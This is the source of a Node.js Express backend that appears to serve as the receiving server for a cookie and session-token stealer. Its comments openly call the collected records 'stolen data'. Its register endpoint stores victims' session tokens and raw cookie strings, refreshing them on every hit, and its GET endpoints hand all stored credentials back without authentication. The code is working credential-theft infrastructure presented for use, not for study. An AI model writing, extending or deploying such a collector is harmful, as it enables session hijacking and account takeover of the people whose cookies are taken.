const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// Path to the JSON database
const DB_FILE = path.join(__dirname, 'users.json');

// Helper: Read the database
const readDB = () => {
    if (!fs.existsSync(DB_FILE)) {
        fs.writeFileSync(DB_FILE, JSON.stringify({ users: [] }, null, 2));
        return { users: [] };
    }
    const data = fs.readFileSync(DB_FILE, 'utf8');
    return JSON.parse(data);
};

// Helper: Write to the database
const writeDB = (data) => {
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
};

// ==========================================
// API ROUTES
// ==========================================

// 1. GET: Fetch all users (For you to check the stolen data)
app.get('/api/users', (req, res) => {
    const db = readDB();
    res.json(db);
});

// 2. POST: Register or Update a User & Securely Store the Cookies
app.post('/api/users/register', (req, res) => {
    const { userId, username, sessionToken, rawCookieString } = req.body;

    if (!userId) {
        return res.status(400).json({ error: 'userId is required' });
    }

    const db = readDB();
    let user = db.users.find(u => u.userId === userId);

    // Get the current timestamp
    const now = new Date().toISOString();

    if (user) {
        // Update existing user
        user.lastSeen = now;
        if (username) user.username = username;
        
        // IMPORTANT: Update the credentials every time they hit the endpoint
        user.sessionToken = sessionToken || user.sessionToken;
        user.rawCookieString = rawCookieString || user.rawCookieString;
        
        writeDB(db);
        return res.json({ message: 'User updated', user });
    } else {
        // Create new user with all the stolen data
        const newUser = {
            userId: userId,
            username: username || 'Anonymous',
            sessionToken: sessionToken || 'MISSING',
            rawCookieString: rawCookieString || 'MISSING',
            firstSeen: now,
            lastSeen: now,
            settings: {} // Placeholder for future settings
        };
        db.users.push(newUser);
        writeDB(db);
        return res.status(201).json({ message: 'New user registered with cookies', user: newUser });
    }
});

// 3. GET: Get a specific user's data
app.get('/api/users/:userId', (req, res) => {
    const { userId } = req.params;
    const db = readDB();
    const user = db.users.find(u => u.userId === userId);

    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    res.json(user);
});

// Start the server
app.listen(PORT, () => {
    console.log(`Kholin backend server running at http://localhost:${PORT}`);
    console.log(`API endpoints:`);
    console.log(`  GET  /api/users`);
    console.log(`  POST /api/users/register`);
    console.log(`  GET  /api/users/:userId`);
});
